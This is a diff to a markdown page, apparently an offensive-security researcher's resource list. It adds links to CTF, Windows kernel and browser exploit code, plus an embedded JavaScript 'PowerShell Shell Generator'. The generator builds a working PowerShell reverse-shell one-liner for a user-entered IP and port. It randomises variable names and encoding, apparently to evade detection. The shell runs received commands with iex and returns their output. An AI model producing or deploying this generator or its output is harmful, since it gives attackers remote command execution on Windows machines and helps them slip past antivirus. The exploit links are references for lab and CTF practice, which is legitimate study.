@@ -8,12 +8,114 @@ order: 4
 
 - <https://vulnlab.com>
 
+## Useful
+
+- <https://wiki.vulnlab.com>
+- [resh.py](https://gist.github.com/xct/ab71d58a29e9017eb38565e32aeb95b0)
+
 ## Shelf
 
 - <https://github.com/xct/winssh>
 - <https://github.com/xct/hashgrab>
 - <https://github.com/xct/rcat>
 - <https://github.com/xct/winpspy>
+
+## Exploits
+
+**Recent**
+
+- [LACTF Rickroll Format String Exploit](https://gist.github.com/xct/0be84416307b66168f050cb9da64c5c4)
+- [IdekCTF 2023 Typop (ROP, CSU)](https://gist.github.com/xct/5c4be3073ba76fea3a52d03a84cf0350)
+- [Real World CTF 2023 NonHeanvyFTP (Race Condition)](https://gist.github.com/xct/f17488f42d48014a5dcc060714dbec1a)
+- [ShaktiCTF 2022 PhrackCrack (Heap – House of Force)](https://gist.github.com/xct/88db526da32d492f3818d15942bbb39b)
+- [ShaktiCTF 2022 Ropworks (ROP)](https://gist.github.com/xct/a2547024ea0922398450c71a44692955)
+- [GlacierCTF 2022 (Heap – Fastbin Dup)](https://gist.github.com/xct/87ee193e28f66813a9e309cf29a4bc3c)
+- [SquareCTF 2022 (Yara / Valgrind)](https://gist.github.com/xct/9b60d9255afe400dd0ce7bb774e613ec)
+- [Ekoparty 2022 (Windows, ROP](https://gist.github.com/xct/c4569bd15ad85ea1b5917325b203e15b)
+- [MTS HW Driver EOP (Windows, Kernel)](https://gist.github.com/xct/7d192b448793fc6decb4b59c5382bd61)
+
+**Windows Kernel Practice**
+
+- [Null Pointer Dereference Win7 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdNullPointerMIWin7x64.cpp)
+- [Pool Overflow Win7 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdPoolOverflowWin7x64.cpp)
+- [Stack Overflow Win10 , GS, Version 2, Version 3 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowACLMI.cpp)
+- [Type Confusion Win10, Version 2 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdTypeConfusionMI.cpp)
+- [Use-after-free Win10 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdUAFMI.cpp)
+- [Arbitrary Read/Write Win10 , Low Integrity, x64 Gigabyte Driver](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/GigabyteDriverMI.cpp)
+- [Arbitrary Write Win10 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdArbitraryWriteMI.cpp)
+
+**Chrome**
+
+- [StarCTF OOB custom patched Chromium, out-of-bounds access, renderer RCE](https://gist.github.com/xct/795216846c75c625fc10bf10d23982e6)
+
+**Firefox**
+
+- [Midenios custom patched Firefox, out-of-bounds access, renderer RCE](https://gist.github.com/xct/f339058bcb946fb8efd6df00cfb81a0d)
+
+## PowerShell Shell Generator
+
+<div>
+    <label for="ip">IP Address:</label>
+    <input type="text" id="ip" placeholder="Enter IP" />
+    <label for="port">Port:</label>
+    <input type="text" id="port" placeholder="Enter Port" />
+    <button onclick="generateCode()">Generate PowerShell</button>
+</div>
+<hr>
+<div id="output" class="generated-code"></div>
+
+<script>
+    // Function to generate random variable names
+    function getRandomVariable() {
+        const chars = 'abcdefghijklmnopqrstuvwxyz';
+        let varName = '';
+        for (let i = 0; i < Math.floor(Math.random() * 5) + 5; i++) {
+            varName += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return varName;
+    }
+
+    // Function to generate a correct byte array
+    function generateByteArray(variableName) {
+        // Ensuring the byte array is initialized correctly with a fixed size
+        return `[byte[]]$${variableName} = New-Object byte[] 65535;`;
+    }
+
+    // Function to generate random PowerShell script as one-liner
+    function generateCode() {
+        const ip = document.getElementById("ip").value;
+        const port = document.getElementById("port").value;
+
+        if (!ip || !port) {
+            alert("Please enter both IP and port");
+            return;
+        }
+
+        const varClient = getRandomVariable();
+        const varStream = getRandomVariable();
+        const varBytes = getRandomVariable();
+        const varData = getRandomVariable();
+        const varSendback = getRandomVariable();
+        const varSendback2 = getRandomVariable();
+        const varSendbyte = getRandomVariable();
+        const varI = getRandomVariable();
+        const varEncoding = Math.random() < 0.5 ? "ASCII" : "UTF8";
+        const flushMethod = Math.random() < 0.5 ? "$stream.Flush();" : "[System.Threading.Thread]::Sleep(100);";
+
+        // Correct byte array initialization
+        const byteArrayInit = generateByteArray(varBytes);
+
+        // Template for PowerShell code (as a one-liner)
+        const powershellTemplate = `
+$${varClient}=New-Object System.Net.Sockets.TCPClient("${ip}",${port});$${varStream}=$${varClient}.GetStream();${byteArrayInit}while(($${varI}=$${varStream}.Read($${varBytes},0,$${varBytes}.Length)) -ne 0){$${varData}=(New-Object -TypeName System.Text.${varEncoding}Encoding).GetString($${varBytes},0,$${varI});$${varSendback}=try{iex $${varData} 2>&1 | Out-String}catch{\$_};$${varSendback2}=$${varSendback}+"[>] ";$${varSendbyte}=([text.encoding]::${varEncoding}).GetBytes($${varSendback2});$${varStream}.Write($${varSendbyte},0,$${varSendbyte}.Length);${flushMethod}};$${varClient}.Close();
+        `.replace(/\s+/g, ' ').replace(/\s?;\s?/g, ';').replace(/\s?{\s?/g, '{').trim();
+
+        document.getElementById("output").innerText = powershellTemplate;
+    }
+</script>
+
+
+
 
 ## Shellcode Converter
 
